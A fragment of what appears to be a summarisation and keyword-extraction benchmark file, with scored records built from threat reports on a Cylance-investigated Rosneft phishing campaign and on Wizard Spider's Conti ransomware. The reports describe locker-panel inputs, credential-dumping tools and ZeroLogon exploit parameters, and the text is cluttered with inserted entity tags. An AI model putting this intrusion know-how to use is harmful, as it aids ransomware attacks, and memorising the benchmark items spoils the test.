Threat Intelligence Bulletin [DATE] Monthly bulletin from [ORG] the [ORG] Cylance [ORG] Threat [ORG] Intelligence [ORG] Team . Author 's Bio14/14", "generated_text": "the document; a state-owned Russian oil company; a prominent foreign policy tool; the Russian government; more than half; the company; critical infrastructure; Russia; other neighboring nation states; the oil company; T&C; a deal; $100 billion; Russian; Shell; assets; a former Qatari diplomat; a sovereign wealth fund; Russia; oil; gas; chemical; agriculture; financial exchanges; a surveillance tool; the threat actor; use; C2; domains; similar; Russian; financial exchanges; internet; stealth; hacking.", "ref_text": "<START-1>The PDF details research conducted by security company Cylance into a three-year hacking campaign targeting Russian critical infrastructure. Cylance initially believed this was a nation-state sponsored attack, but further investigation revealed it was likely criminally motivated. - Cylance uncovered phishing documents containing malware targeting Russian oil and gas companies, primarily Rosneft. The documents used macros to download malware. - The malware was a backdoor called RedControle that could capture screenshots, keystrokes, etc. It communicated with infrastructure mimicking real Russian companies. - In addition to Rosneft, the attacker mimicked over two dozen mostly state-owned Russian companies in oil, gas, agriculture, chemicals, etc. They used lookalike domains for command and control. - The malware evolved from initially targeting the gaming community to more lucrative targets in Russian critical infrastructure. - Open source intelligence connected the malware to past criminal campaigns targeting gamers. - The attacker relied on cheap VPS services, putting in considerable effort to mimic legitimate companies for credential harvesting and fraud. - Cylance believes this was a criminal operation rather than state-sponsored espionage, despite the targets. Criminals can exploit inherent biases that sophisticated attacks on critical infrastructure appear to be nation-state activity. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.47093023255813954, "gpt3/lexical/rouge_rouge2": 0.1286549707602339, "gpt3/lexical/rouge_rougeL": 0.2558139534883721, "gpt3/lexical/rouge_rougeLsum": 0.2558139534883721, "gpt3_generated_text": ["The article discusses a three-year campaign that targeted a state-owned Russian oil company, Rosneft, which is also a prominent foreign policy tool of the Russian government. The campaign was initially believed to be a state-sponsored cyber espionage effort, but it was later discovered to be the work of a criminal group motivated by financial gain. The campaign involved the use of phishing documents with embedded macros to deliver malicious implants to targets. The threat actor created fake websites that closely mimicked the legitimate websites of various critical infrastructure organizations, including Rosneft and its subsidiaries, as well as major Russian financial exchanges. The actor had been operating for over three years and initially targeted the gaming community before moving on to more lucrative endeavors. The article highlights the need for researchers to consider the possibility of criminal activity when investigating cyber campaigns, as criminals can exploit the bias towards state-sponsored threats."]}, {"split_name": "test", "sample_id": "test_65", "prompt_text": "Extract the keywords: [PERSON] Wizard [PERSON] Spider In - Depth AnalysisTLP : [ORG] WHITEContentsReferences1Introduction2 [ORG] Executive [ORG] Summary3 Technical Analysis .3.1 Hypervisor Encryption Server Auto - Locker Deployment .3.1.1 3.1.2 Conti Ransomware [CARDINAL] 3.2 Post [ORG] - [ORG] Exploitation [ORG] Infrastructure . [CARDINAL] 3.2.1 [CARDINAL] 3.2.2 3.2.3 Cracking Station . . [CARDINAL] 3.2.4 Cold - Calling System . . 3.2.5 Daily Cobalt Strikes Beacons . [CARDINAL] 3.4 De [ORG] - Anonymization . . [CARDINAL] 3.5 Author Profiling and Linguistic Evidence . 3.3.1 3.3.2 . 3.3.3 VPN Infrastructure . [CARDINAL] 3.3.4 QBot Relation . [ORG] Proxy [ORG] Network .Syntax .3.5.1 [CARDINAL] 3.5.2 Grammaticality . . [ORG] 3.5.3 [ORG] Choice [ORG] of Vocabulary .3.3 Extortion Servers .4 Statistics and Observations .4.1 [PERSON] Victim [PERSON] Statistics . . [CARDINAL] 4.2 Cracking Station Activity .5 [ORG] Conclusion6 IOC6.1 [ORG] Conti [ORG] Ransomware [ORG] Hashes . [CARDINAL] 6.2 Locker Servers . [CARDINAL] 6.3 [ORG] Proxy [ORG] Network . [CARDINAL] 6.4 Extortion Servers . . [CARDINAL] 6.5 Intrusion Servers . [CARDINAL] 6.6 CobaltStrike Servers . .Wizard [PERSON] Spider [PERSON] Case [PERSON] Report2456 .DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.2 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportReference [PERSON] Number [PERSON] CH-2021102501 Prepared By Investigation Date 14.11.2021 - 18.03.2022 Initial Report Date Last Update18.03.2022 [CARDINAL] 20.03.2022PTI TeamWhat \u2019s new ? [ORG] The [ORG] PRODAFT [ORG] Threat [ORG] Intelligence ( PTI ) team has assembled this report to provide in - depth knowledge about [PERSON] Conti malware and the group of threat actors that use it . Our team identified the group as [PERSON] Wizard [PERSON] Spider , and obtained visibility into its operational environment . This report provides unprecedented visibility into the structure , background , and motivations of [PERSON] Wizard [PERSON] Spider . We \u2019ve obtained command statistics , target country statistics , command execution patterns , and other information on the group \u2019s tactics , techniques , and procedures . These include novel post - exploitation cracking solutions and psychological tactics . This is the [ORDINAL] first time a private company has successfully reported on the inner workings of this group . By publishing it , the PTI team is bringing new , exclusive information about [PERSON] Wizard [PERSON] Spider \u2019s internal organization that can help inform its targets \u2019 cybersecurity defenses . All [PERSON] Wizard [PERSON] Spider victims identified in the C&C Panel have been informed through official channels . Indicators of Compromise ( IOCs ) and references are provided at the end of this report . Please note that this report has [CARDINAL] two versions . The \u201d Private Release \u201d is provided to law enforcement agencies , applicable [ORG] CERTS [ORG] / [ORG] CSIRTS , and members of our [GPE] U.S.T.A. Threat Intel [PERSON] Platform ( with appropriate annotations and reductions ) . Likewise , the \u201d Public Release \u201d is publicly disseminated for the purpose of advancing the global fight against high - end threat actors and APTs . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.3 / 35TLP : [PERSON] WHITE1IntroductionWizard [PERSON] Spider [PERSON] Case [PERSON] ReportThis report shows the results of [ORG] the [ORG] PRODAFT [ORG] Threat [ORG] Intelligence ( PTI ) Team \u2019s comprehensive investigation into the [PERSON] Wizard [PERSON] Spider cybercrime group . The group is also known by the various malware variants it uses ( [ORG] Ryuk , [PERSON] Trickbot , and [PERSON] Conti , among others ) . It is a financially motivated cybercrime group [ORDINAL] first identified in [DATE] 2017 , and may be one of the wealthiest groups currently in operation , with total assets easily in excess [MONEY] hundreds [MONEY] of [MONEY] millions [MONEY] of [MONEY] dollars . The group \u2019s extraordinary profitability allows its leaders to invest in illicit research and development initiatives . [PERSON] Wizard [PERSON] Spider is fully capable of hiring specialist talent , building new digital infrastructure , and purchasing access to advanced exploits . It has also apparently invested in its own panel - hosting cracking application and hired telephone operators to cold - call victims and scare them into paying . The PTI team has been actively tracking the [PERSON] Wizard [PERSON] Spider group since releasing our first public report in [DATE] November [DATE] 2021 . This prevented [CARDINAL] hundreds of ransomware attacks and notified [CARDINAL] more [CARDINAL] than [CARDINAL] 128000 victims that were targeted by the group . These victims include defense and aerospace companies , food producers , supply chain providers , hospitals , government agencies , and critical infrastructure providers . We obtained visibility into critical elements of the group \u2019s infrastructure and collected vital data on its kill chain , as shown below . Figure [CARDINAL] 1 . Our visibility on the [PERSON] Wizard [PERSON] Spider \u2019s operational environment . [PERSON] Victim statistics by country and observations from the operational environment are provided in detail in the following sections . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.4 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report2 Executive [PERSON] SummaryWizard [PERSON] Spider is a highly profitable cybercrime group that operates a number of sophisticated malware variants in its attacks . The PTI team has been collecting data on [PERSON] Wizard [PERSON] Spider \u2019s operations since publishing its [ORDINAL] first report on [PERSON] Conti in [DATE] November [DATE] 2021.Our team has discovered valuable new information about [PERSON] Wizard [PERSON] Spider and its relationship to other cybercrime groups and software producers . This report contains technical analysis on [PERSON] Wizard [PERSON] Spider \u2019s capabilities and its command structure , which includes a complex set of sub - teams divided into software - specific groups . [PERSON] Wizard [PERSON] Spider is capable of managing attacks from start to finish using its own distributed capabilities , assigning pre - attack preparations to certain teams and post - exploitation tasks to others . Figure [CARDINAL] 2 . Risks to contain [PERSON] Wizard [PERSON] Spider \u2019s attack at each stage . This report will help organizations prepare for highly coordinated cyberattacks that use distributed command structures to exploit high - value targets . Its insights will help security professionals protect sensitive data and assets from the multiple exploitation stages that characterize a [PERSON] Wizard [PERSON] Spider attack . Note that risks and costs to contain these attacks increase at later stages , as shown in Figure 2.The PRODAFT Threat Intelligence team is publishing this data now to help information security leaders detect and respond to attacks that use malware variants in [PERSON] Wizard [PERSON] Spider \u2019s technology stack . Recent public leaks about the threat actors behind [PERSON] Conti ransomware have pushed our publication deadline ahead of schedule . The PTI team has extensively covered [PERSON] Conti ransomware in the past , and is now extending that investigation by publishing new data and insights into the inner workings of [PERSON] Wizard [PERSON] Spider . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.5 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3 [PERSON] Technical AnalysisThis section outlines the tools , techniques , and tactics [PERSON] Wizard [PERSON] Spider uses to carry out its attacks . It contains vital information about the group \u2019s distribution mechanism , locker sample , intrusion server , extortion server , backup storage , and the hash cracking station . Based on our observations , the team \u2019s attack starts with the mass - scale spam campaign using QBot and proxy malware ( SystemBC ) with the help of compromised business email conversations . Then , another team uses domain - based selection to pinpoint the valuable targets for their ransom demands and deploy [PERSON] Cobalt [PERSON] Strike for lateral movement activities . If the intrusion team successfully obtains the domain admin privilege , they deploy [ORG] Conti \u2019s ransomware strain . This section provides our findings on their operational environment.3.1 [ORG] Hypervisor [ORG] Encryption [ORG] ServerDuring the investigation , the PTI team discovered a unique system used by the [PERSON] Wizard [PERSON] Spider \u2019s sub - team that targets the hypervisor servers ( e.g. , [ORG] VMWare ESXi ) with the [PERSON] Conti ransomware strain . After threat actors exfiltrate data from their victim \u2019s servers , they prepare and upload a special locker software on their own [ORG] Locker [ORG] Software [ORG] Server . This locker software directly targets hypervisor servers and encrypts them , leaving a ransom note on the desktop , in the characteristic style of a typical [PERSON] Conti ransomware attack . Further investigation revealed that the attackers directly scanned and exploited [CARDINAL] hundreds of [ORG] VMware vCenter servers with [PERSON] Log4j ( CVE-2021 [ORG] - 44228 ) vulnerabilities.[3 ] Interestingly , several scanner [ORG] IP addresses were also used as Cobalt Strike C2 servers in the subsequent attacks.3.1.1 Auto [ORG] - [ORG] Locker DeploymentAt the time of our analysis , the PTI team detected and performed detailed analysis onthe following [ORG] Hypervisor [ORG] Encryption [ORG] Server . Username [PERSON] IP [PERSON] Spider \u2019s auto - encryption panel . The panel expects several input to perform their tasks . By inputting victim access credentials obtained via SOCKS [ORG] IPs , threat actors could drop locker malware directly onto victim \u2019s devices and servers . The SOCKS proxy [ORG] IP addresses that were used generally connect with Cobalt Strike servers used by [PERSON] Wizard [PERSON] Spider . If this locker attack fails , threat actors will reuse the same locker software for other attacks . Each of the fields on the panel has a specific role to play encrypting victims \u2019 servers . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.6 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportFigure 3 shows the auto - encryption panel filled with real victim data , and the below describes the expected input of the system . Figure [CARDINAL] 3 . Hypervisor encryption system.1 . Socks Proxy List : Socks proxy provided by [ORG] CobaltStrike or SystemBC to victim \u2019s internalnetwork.2 . Threads : Thread count for simultaneous tasks . [CARDINAL] 3 . [ORG] Locker [ORG] File : Ransomware executable binary . [CARDINAL] 4 . Locker Link : External victim - specific locker link to download locker file . [CARDINAL] 5 . Excluded Files [ORG] / Folders [ORG] : Excluded paths for ransomware . [CARDINAL] 6 . SOCKS Version : Socks Proxy version . [CARDINAL] 7 . Locker Params : Ransomware executable parameters . [CARDINAL] 8 . [ORG] SSH [ORG] Credentials : [ORG] SSH [ORG] Credentials of victim \u2019s servers . [CARDINAL] 9 . [PRODUCT] Active [PRODUCT] Task : Shows active task \u2019s status . [CARDINAL] 10 . Management Buttons : Start and stop the tasks . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.7 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportAfter locker panel activation , the software establishes a connection with the [ORG] VPN using the access keys on the victim \u2019s device . Immediately upon being seized , [ORG] SSH credentials are created for each victim \u2019s virtual machine . The locker software \u2019s operations on the machine can be tracked , as seen in Figure [CARDINAL] 4 . Table [CARDINAL] 2 shows some of the example locker software servers used by the [PERSON] Wizard [PERSON] Spider team to deploy [PERSON] Conti ransomware . Figure [CARDINAL] 4 . Hypervisor encryption system in action . Date 16.12.2021 16.12.2021 16.12.2021 17.12.2021 22.12.2021 23.12.2021 24.12.2021 26.01.2022 28.01.2022 29.01.2022 30.01.2022ISP LEASEWEB - USA - MIA-11Country [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] United [GPE] States DACEN-2 [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] Netherlands [GPE] United [GPE] States RELIABLESITE be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law [ORG] No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal [DATE] authorities.8 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case Report3.1.2 [PERSON] Conti [PERSON] RansomwareFile [PERSON] Name encryptor1 a Hypervisor Server encryptor by the [PERSON] Conti ransomware team . It has different features than the encryption software ( [ORG] PE ) used on Windows machines and is compiled dynamically . Upon technical analysis by the PTI team , the software was found to be taking parameters as seen in Figure [DATE] 5.Figure [DATE] 5 . Locker software command line argument handling . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.9 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportAfter receiving arguments from the threat actor , the malware checks whether the \u201d detach \u201d feature is specified . If the feature is specified , the malware \u201d forks \u201d , terminating the parent process and continuing with a \u201d child \u201d process on the victim system . Then , the malware makes the necessary adjustments for encryption . Reverse engineering studies showed that the malware performs \u201d initialization \u201d with the \u201d Public Key \u201d in ASN.1 format using the \u201d CryptoPP \u201d library . Figure [CARDINAL] 6 . Locker software initialization of encryption method . At the last stage , the malware uses a \u201d callback \u201d function for all the files it finds and follows the path specified in the \u201d path \u201d argument . This \u201d callback \u201d function checks whether the \u201d \u2013 prockiller \u201d feature is activated . The \u201d \u2013 prockiller \u201d feature searches for processes with names specified in the \u201d /proc \u201d file system and checks if the related file is executable . The malware immediately terminates every named process it finds in the file system . After the process checking stage , the malware checks the extensions it contains . If the file extension is on the list , the malware will refuse to encrypt that type of file . Figure [CARDINAL] 7 shows the locker parameters obtained from [ORG] ContiLeaks and verifies our findings . Figure [CARDINAL] 7 . Locker parameters ( Source : ContiLeaks).DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.10 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportFigure [PERSON] 8 . [ORG] Locker [ORG] Software [ORG] File [ORG] Encryption [ORG] RoutineFigure [ORG] 8 shows the encryption routine that instructs the malware to encrypt all files in the system and change the encrypted files \u2019 extension to \u201d .conti . \u201dDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.11 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case Report3.2 Post [ORG] - [ORG] Exploitation [ORG] InfrastructureBefore engaging the scenarios described above , threat actors use many different methods to research targets , scan for vulnerabilities , and attempt zero [DATE] - day exploits through intrusion servers . We identified several intrusion servers belonging to [PERSON] Wizard [PERSON] Spider threat actors . They contain tactics , techniques , and procedures of threat actors , purchased zero [DATE] - day exploits , connected server addresses , [PERSON] Bitcoin addresses marked for payment , and various sensitive data on their operational environment . Threat actors kept notes to share between the teams in the form of encrypted ZIP files.3.2.1Intrusion ServersDuring the investigation of [PERSON] Wizard [PERSON] Spider \u2019s intrusion servers , the PTI team obtained visibility into multiple critical elements of the group \u2019s infrastructure . We obtained valuable information on tools , user manual files , and existing techniques , tactics , and procedures that threat actors use to test and attack victims \u2019 systems . Table [CARDINAL] 4 shows the [CARDINAL] two servers that are associated to the [PERSON] Wizard [PERSON] Spider team . Domain leak files published by [ORG] Contileaks since [DATE] February 27 , [DATE] 2022 . These servers contain [ORG] Conti \u2019s locker files , [PRODUCT] Bazarloader samples , victim statistics , and [ORG] Active [ORG] Directory dumps of some companies published by [PERSON] Conti in their victim blogs . Figure [CARDINAL] 9 shows the publicly accessible files obtained from the intrusion server . Figure [CARDINAL] 9 . Publicly accessible files ( toolset ) obtained from the intrusion server . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.12 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case ReportThe PTI team discovered tools and techniques that are actively used by [PERSON] Wizard [PERSON] Spider team members on the intrusion servers . Some of our findings can be verified using public [ORG] ContiLeaks , as seen in the Figure [CARDINAL] 10 . The excerpt list of the tools detected on these servers are : \u2022 Sharefinder.ps1 ( Shared folder search ) \u2022 Seatbelt ( Enumeration and credential dumping ) \u2022 Rubeus ( [ORG] Kerberos interaction and abuses ) \u2022 [GPE] NTDSAudit ( Active directory audit tool ) \u2022 PsTools , Process Explorer ( System analysis ) \u2022 Secretsdump ( Dump domain credentials ) [ORG] \u2022 [ORG] NSSM ( Service management ) \u2022 Angry IP Scanner ( Network reconnaissance ) \u2022 [ORG] AdFind ( [ORG] Active [ORG] Directory query tool ) \u2022 Net - GPPPassword ( Credential dumping ) \u2022 Mimikatz ( Memory dumping ) \u2022 Go - Loader - MVP ( Custom scripts to load executable into memory ) \u2022 [ORG] RClone ( Data cloning tool ) \u2022 [ORG] AnyDesk ( [ORG] Remote administration tool ) \u2022 [ORG] FileZilla ( [ORG] FTP [ORG] Client ) \u2022 SessionGopher ( Saved session extraction tool)Figure [CARDINAL] 10 . Toolkit sample of the [PERSON] Wizard [PERSON] Spider ( Source : [ORG] ContiLeaks . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.13 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.2.2 [PERSON] Exploitation ToolsetThe [PERSON] Wizard [PERSON] Spider team uses custom toolkit that can exploit zero [DATE] - day / one [DATE] - day / n - day vulnerabilities in their attacks in addition to public tools . The most recent one is the Log4j vulnerability mentioned in previous sections . During the PTI team \u2019s analysis of [PERSON] Wizard [PERSON] Spider \u2019s intrusion servers , our analysts determined that the [PERSON] Wizard [PERSON] Spider team purchased and used zero [DATE] - day exploits from other threat actors and used current and public vulnerabilities . This finding was corroborated with the information published by [ORG] Contileaks as well . For simplicity , only some of the samples are showed in this section . However , entire toolkit data can be shared with the researchers upon request . Upon detailed analysis of files on the intrusion server , the PTI team detected a domain named hidusi.com in emergency.html file . Examining the domain logs of the file , our team determined that [PERSON] Wizard [PERSON] Spider was currently managing a server that exploited the CVE-2021 - 40444 zero [DATE] - day vulnerability.[5 ] This zero [DATE] - day vulnerability impacts [PERSON] Microsoft [PERSON] Word and [ORG] Microsoft [ORG] Explorer with malicious documents that deliver a customized version of Cobalt Strike BEACON.Figure [CARDINAL] 11 . Example usage of CVE-2021 [ORG] - 40444 exploit . In addition , a file named zero.exe was discovered on the same server . Upon analysis , it appeared to establish a connection with the Security Account Manager \u2019s database on the target system with administrator \u2019s account credentials using [ORG] ZeroLogon vulnerability . To trigger the corresponding exploit , the threat actor must provide the following parameters : [ORG] Target [ORG] IP [ORG] Address , Domain [PERSON] Controller [PERSON] Name , [PERSON] Domain [PERSON] Name , and [PERSON] Admin [PERSON] Username . The same exploit and its usage can be found in [ORG] ContiLeaks \u2019s public release ( internal [ORG] TrickBot forum).Figure [CARDINAL] 12 . [ORG] ZeroLogon exploit . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.14 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.2.3 Cracking StationThe PTI team detected and performed a detailed analysis on the custom hash cracking system of the [PERSON] Wizard [PERSON] Spider team . This system stores cracked hashes , updates threat actors on the cracking status and shows the results of cracking attempts on other servers . The system can crack the LM : [ORG] NTLM hashes , cached domain credentials , Kerberos [CARDINAL] 5 TGS [ORG] - REP [ORG] / AS [ORG] - REP tickets , [ORG] KeePass files , MS Office 2013 files , and other types of common hashes . Moreover , the cracking station features the following [CARDINAL] five elements :1 . The hash value ( MD5 , SHA1 , etc . ) that the attackers wish to crack . [CARDINAL] 2 . Description text that reflects individual victim information . [CARDINAL] 3 . Priority value , which allows attackers to focus on high - value targets [ORDINAL] first . [CARDINAL] 4 . Status text shows how the cracking process is going . [CARDINAL] 5 . The result field contains the decrypted version of the hash value . Figure [CARDINAL] 13 . Management panel of [ORG] the [ORG] Cracking [ORG] Station . Figure [CARDINAL] 13 shows the management screen of the cracking station . While analyzing the hashes inserted into the database by attackers , we detected a lot of [NORP] Russian comments ( as shown in Figure [CARDINAL] 14 ) . Apparently teams use comments as a simple communication tool . In addition to communication , the privileged users track the activity to determine the workload of the threat actors . Therefore , the cracking station plays a crucial role in the team \u2019s operational environment . Figure [CARDINAL] 14 . Sample [NORP] Russian comments in the system . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.15 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportWe detected [CARDINAL] 32 active users in the cracking station ( listed in [LAW] Table [LAW] 5 ) , and this allowing us to identify the threat actors behind the [PERSON] Conti ransomware [PERSON] attacks.admin [PERSON] sargonrmmID Nickname Last Activity Count 3516 - 02 - 2022 28 - 02 - 2022 18 - 08 - 2021 24 - 02 - 2022 21 - 07 - 2021 29 - 12 - 2021 12 - 07 - 2021 19 - 07 - 2021 17 - 11 - 2021 18 - 02 - 2022 12 - 10 - 2021 28 - 02 - 2022 26 - 01 - 2022 04 - 10 - 2021 13 - 02 - 2022 25 - 02 - 2022 07 - 09 - 2021 03 - 11 - 2021 28 - 07 - 2021 31 - 10 - 2021 25 - 11 - 2021 29 - 09 - 2021 25 - 02 - 2022 29 - 12 - 2021 15 - 02 - 2022 21 - 02 - 2022 10 - 12 - 2021 13 - 10 - 2021 16 - 02 - 2022 12 - 11 - 2021 28 - 02 - 2022 13 - 02 - 20222 eldoradoExternal Identifyrozetka@q3mcco35auwcstmt.onion ali@q3mcco35auwcstmt.onion fly@q3mcco35auwcstmt.onion andy@q3mcco35auwcstmt.onion slice@wfy76wigkpoxqbe6.onion twin@btsxjckg5tgag3via6wi7irpywl6w2fh66pmwt6zlbf5vlyyvnjjxcad.onion alex@btsxjckg5tgag3via6wi7irpywl6w2fh66pmwt6zlbf5vlyyvnjjxcad.onion stakan@q3mcco35auwcstmt.onion chuck@Bazargiovanni@wfy76wigkpoxqbe6.onion fury@q3mcco35auwcstmt.onion air@q3mcco35auwcstmt.onion red@wfy76wigkpoxqbe6.onion shved@Bazar jack@6yp2jljwgdxmwy4uxfaxbkjgm2txlxxb5akxn43cyaz3cjo2gqd65yid.onionhasher@wfy76wigkpoxqbe6.onion sargon@wfy76wigkpoxqbe6.onion doyf@wfy76wigkpoxqbe6.onion grimnir@wfy76wigkpoxqbe6.onion hagrid@Bazar prince@wfy76wigkpoxqbe6.onionsebastian@wfy76wigkpoxqbe6.onion terner@wfy76wigkpoxqbe6.onion baraka@q3mcco35auwcstmt.onion donald@btsxjckg5tgag3via6wi7irpywl6w2fh66pmwt6zlbf5vlyyvnjjxcad.onion sonar@q3mcco35auwcstmt.onion eldorado@btsxjckg5tgag3via6wi7irpywl6w2fh66pmwt6zlbf5vlyyvnjjxcad.onionTable [CARDINAL] 5 . Cracking station users . Please note that the findings obtained from the cracking station can be verified or enriched using the public [ORG] ContiLeaks . For simplicity , we did not include any de - anonymized information of the actors in this report . However , feel free to ask for any specific details of the past ransomware attacks to identify the threat actor behind the scene . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.16 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case Report3.2.4 Cold - Calling [PRODUCT] SystemWizard [PRODUCT] Spider team uses 